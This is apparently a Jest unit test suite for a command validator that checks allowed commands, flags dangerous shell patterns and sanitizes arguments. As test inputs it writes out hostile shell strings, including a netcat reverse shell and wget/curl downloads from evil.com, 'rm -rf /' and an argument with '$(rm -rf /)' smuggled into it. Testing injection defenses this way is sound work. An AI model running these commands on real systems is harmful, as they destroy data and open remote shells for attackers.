/**
 * Unit Tests: Command Validator
 * Tests command injection prevention and sanitization
 */

// Mock logger
jest.mock('../../../src/utils/logger', () => ({
  logger: {
    warn: jest.fn(),
    error: jest.fn(),
    info: jest.fn(),
    debug: jest.fn(),
  },
}));

// Mock security config
jest.mock('../../../src/config/security.config', () => ({
  securityConfig: {
    commandExecution: {
      enabled: false,
      allowedCommands: [],
    },
  },
}));

describe('Command Validator', () => {
  beforeEach(() => {
    jest.resetModules();
    jest.clearAllMocks();
  });

  // ============================================
  // isCommandExecutionEnabled
  // ============================================
  describe('isCommandExecutionEnabled', () => {
    it('should return false when disabled', () => {
      const { isCommandExecutionEnabled } = require('../../../src/utils/command-validator');
      expect(isCommandExecutionEnabled()).toBe(false);
    });

    it('should return true when enabled', () => {
      jest.resetModules();
      jest.doMock('../../../src/config/security.config', () => ({
        securityConfig: {
          commandExecution: {
            enabled: true,
            allowedCommands: ['ls', 'echo'],
          },
        },
      }));
      const { isCommandExecutionEnabled } = require('../../../src/utils/command-validator');
      expect(isCommandExecutionEnabled()).toBe(true);
    });
  });

  // ============================================
  // isCommandAllowed
  // ============================================
  describe('isCommandAllowed', () => {
    beforeEach(() => {
      jest.resetModules();
      jest.doMock('../../../src/config/security.config', () => ({
        securityConfig: {
          commandExecution: {
            enabled: true,
            allowedCommands: ['ls', 'echo', 'cat'],
          },
        },
      }));
    });

    it('should return true for allowed command', () => {
      const { isCommandAllowed } = require('../../../src/utils/command-validator');
      expect(isCommandAllowed('ls')).toBe(true);
      expect(isCommandAllowed('echo')).toBe(true);
      expect(isCommandAllowed('cat')).toBe(true);
    });

    it('should return false for disallowed command', () => {
      const { isCommandAllowed } = require('../../../src/utils/command-validator');
      expect(isCommandAllowed('rm')).toBe(false);
      expect(isCommandAllowed('wget')).toBe(false);
      expect(isCommandAllowed('curl')).toBe(false);
    });

    it('should extract base command from full command string', () => {
      const { isCommandAllowed } = require('../../../src/utils/command-validator');
      expect(isCommandAllowed('ls -la /tmp')).toBe(true);
      expect(isCommandAllowed('echo hello world')).toBe(true);
    });

    it('should return false for null/undefined', () => {
      const { isCommandAllowed } = require('../../../src/utils/command-validator');
      expect(isCommandAllowed(null as any)).toBe(false);
      expect(isCommandAllowed(undefined as any)).toBe(false);
    });

    it('should return false for non-string', () => {
      const { isCommandAllowed } = require('../../../src/utils/command-validator');
      expect(isCommandAllowed(123 as any)).toBe(false);
      expect(isCommandAllowed({} as any)).toBe(false);
    });

    it('should return false for empty string', () => {
      const { isCommandAllowed } = require('../../../src/utils/command-validator');
      expect(isCommandAllowed('')).toBe(false);
    });
  });

  // ============================================
  // containsDangerousPatterns
  // ============================================
  describe('containsDangerousPatterns', () => {
    let containsDangerousPatterns: any;

    beforeEach(() => {
      jest.resetModules();
      const module = require('../../../src/utils/command-validator');
      containsDangerousPatterns = module.containsDangerousPatterns;
    });

    it('should detect semicolon command chaining', () => {
      expect(containsDangerousPatterns('ls; rm -rf /')).toBe(true);
    });

    it('should detect pipe operator', () => {
      expect(containsDangerousPatterns('cat file | grep secret')).toBe(true);
    });

    it('should detect ampersand operators', () => {
      expect(containsDangerousPatterns('ls && rm -rf /')).toBe(true);
    });

    it('should detect backtick command substitution', () => {
      expect(containsDangerousPatterns('echo `whoami`')).toBe(true);
    });

    it('should detect $() command substitution', () => {
      expect(containsDangerousPatterns('echo $(whoami)')).toBe(true);
    });

    it('should detect variable expansion', () => {
      expect(containsDangerousPatterns('echo ${PATH}')).toBe(true);
    });

    it('should detect output redirect', () => {
      expect(containsDangerousPatterns('echo test > /etc/passwd')).toBe(true);
    });

    it('should detect append redirect', () => {
      expect(containsDangerousPatterns('echo test >> /etc/passwd')).toBe(true);
    });

    it('should detect input redirect', () => {
      expect(containsDangerousPatterns('cat < /etc/passwd')).toBe(true);
    });

    it('should detect newline command chaining', () => {
      expect(containsDangerousPatterns('ls\nrm -rf /')).toBe(true);
    });

    it('should detect sudo', () => {
      expect(containsDangerousPatterns('sudo rm -rf /')).toBe(true);
    });

    it('should detect chmod', () => {
      expect(containsDangerousPatterns('chmod 777 /etc/passwd')).toBe(true);
    });

    it('should detect chown', () => {
      expect(containsDangerousPatterns('chown root:root file')).toBe(true);
    });

    it('should detect dangerous rm', () => {
      expect(containsDangerousPatterns('rm -rf /')).toBe(true);
    });

    it('should detect wget', () => {
      expect(containsDangerousPatterns('wget http://evil.com/script.sh')).toBe(true);
    });

    it('should detect curl', () => {
      expect(containsDangerousPatterns('curl http://evil.com/script.sh')).toBe(true);
    });

    it('should detect netcat', () => {
      expect(containsDangerousPatterns('nc -e /bin/sh evil.com 1234')).toBe(true);
    });

    it('should detect ssh', () => {
      expect(containsDangerousPatterns('ssh user@host')).toBe(true);
    });

    it('should return false for safe commands', () => {
      expect(containsDangerousPatterns('ls')).toBe(false);
      expect(containsDangerousPatterns('echo hello')).toBe(false);
      expect(containsDangerousPatterns('cat file.txt')).toBe(false);
    });

    it('should return false for null/undefined', () => {
      expect(containsDangerousPatterns(null as any)).toBe(false);
      expect(containsDangerousPatterns(undefined as any)).toBe(false);
    });
  });

  // ============================================
  // sanitizeArguments
  // ============================================
  describe('sanitizeArguments', () => {
    let sanitizeArguments: any;

    beforeEach(() => {
      jest.resetModules();
      const module = require('../../../src/utils/command-validator');
      sanitizeArguments = module.sanitizeArguments;
    });

    it('should remove semicolons', () => {
      const result = sanitizeArguments(['test; rm -rf /']);
      expect(result[0]).not.toContain(';');
    });

    it('should remove pipe operators', () => {
      const result = sanitizeArguments(['test | cat']);
      expect(result[0]).not.toContain('|');
    });

    it('should remove ampersands', () => {
      const result = sanitizeArguments(['test & bg']);
      expect(result[0]).not.toContain('&');
    });

    it('should remove backticks', () => {
      const result = sanitizeArguments(['`whoami`']);
      expect(result[0]).not.toContain('`');
    });

    it('should remove dollar signs', () => {
      const result = sanitizeArguments(['$PATH']);
      expect(result[0]).not.toContain('$');
    });

    it('should remove parentheses', () => {
      const result = sanitizeArguments(['$(whoami)']);
      expect(result[0]).not.toContain('(');
      expect(result[0]).not.toContain(')');
    });

    it('should escape backslashes', () => {
      const result = sanitizeArguments(['test\\path']);
      expect(result[0]).toContain('\\\\');
    });

    it('should escape double quotes', () => {
      const result = sanitizeArguments(['test"value']);
      expect(result[0]).toContain('\\"');
    });

    it('should escape single quotes', () => {
      const result = sanitizeArguments(["test'value"]);
      expect(result[0]).toContain("\\'");
    });

    it('should handle multiple arguments', () => {
      const result = sanitizeArguments(['arg1;', 'arg2|', 'arg3&']);
      expect(result[0]).not.toContain(';');
      expect(result[1]).not.toContain('|');
      expect(result[2]).not.toContain('&');
    });

    it('should preserve safe content', () => {
      const result = sanitizeArguments(['hello', 'world', '123']);
      expect(result).toEqual(['hello', 'world', '123']);
    });
  });

  // ============================================
  // validateCommand
  // ============================================
  describe('validateCommand', () => {
    describe('when command execution is disabled', () => {
      beforeEach(() => {
        jest.resetModules();
        jest.doMock('../../../src/config/security.config', () => ({
          securityConfig: {
            commandExecution: {
              enabled: false,
              allowedCommands: [],
            },
          },
        }));
      });

      it('should return invalid with error message', () => {
        const { validateCommand } = require('../../../src/utils/command-validator');
        const result = validateCommand('ls');
        expect(result.valid).toBe(false);
        expect(result.errors).toContain('Command execution is disabled');
      });
    });

    describe('when command execution is enabled', () => {
      beforeEach(() => {
        jest.resetModules();
        jest.doMock('../../../src/config/security.config', () => ({
          securityConfig: {
            commandExecution: {
              enabled: true,
              allowedCommands: ['ls', 'echo'],
            },
          },
        }));
      });

      it('should validate allowed command', () => {
        const { validateCommand } = require('../../../src/utils/command-validator');
        const result = validateCommand('ls');
        expect(result.valid).toBe(true);
        expect(result.errors).toHaveLength(0);
      });

      it('should reject disallowed command', () => {
        const { validateCommand } = require('../../../src/utils/command-validator');
        const result = validateCommand('rm');
        expect(result.valid).toBe(false);
        expect(result.errors).toContain('Command "rm" is not in the allowed list');
      });

      it('should reject command with dangerous patterns', () => {
        const { validateCommand } = require('../../../src/utils/command-validator');
        const result = validateCommand('ls; rm -rf /');
        expect(result.valid).toBe(false);
        expect(result.errors).toContain('Command contains dangerous patterns');
      });

      it('should reject dangerous arguments', () => {
        const { validateCommand } = require('../../../src/utils/command-validator');
        const result = validateCommand('echo', ['$(rm -rf /)']);
        expect(result.valid).toBe(false);
        expect(result.errors.some((e: string) => e.includes('dangerous patterns'))).toBe(true);
      });

      it('should sanitize arguments', () => {
        const { validateCommand } = require('../../../src/utils/command-validator');
        const result = validateCommand('echo', ['hello', 'world']);
        expect(result.sanitizedArgs).toEqual(['hello', 'world']);
      });

      it('should return empty sanitized command when invalid', () => {
        const { validateCommand } = require('../../../src/utils/command-validator');
        const result = validateCommand('');
        expect(result.valid).toBe(false);
        expect(result.sanitizedCommand).toBe('');
      });
    });
  });

  // ============================================
  // buildSafeCommand
  // ============================================
  describe('buildSafeCommand', () => {
    describe('when command execution is enabled', () => {
      beforeEach(() => {
        jest.resetModules();
        jest.doMock('../../../src/config/security.config', () => ({
          securityConfig: {
            commandExecution: {
              enabled: true,
              allowedCommands: ['ls', 'echo'],
            },
          },
        }));
      });

      it('should build command without arguments', () => {
        const { buildSafeCommand } = require('../../../src/utils/command-validator');
        const result = buildSafeCommand('ls');
        expect(result).toBe('ls');
      });

      it('should build command with escaped arguments', () => {
        const { buildSafeCommand } = require('../../../src/utils/command-validator');
        const result = buildSafeCommand('echo', ['hello', 'world']);
        expect(result).toBe('echo "hello" "world"');
      });

      it('should return null for invalid command', () => {
        const { buildSafeCommand } = require('../../../src/utils/command-validator');
        const result = buildSafeCommand('rm');
        expect(result).toBeNull();
      });

      it('should return null for dangerous command', () => {
        const { buildSafeCommand } = require('../../../src/utils/command-validator');
        const result = buildSafeCommand('ls; rm -rf /');
        expect(result).toBeNull();
      });
    });
  });
});
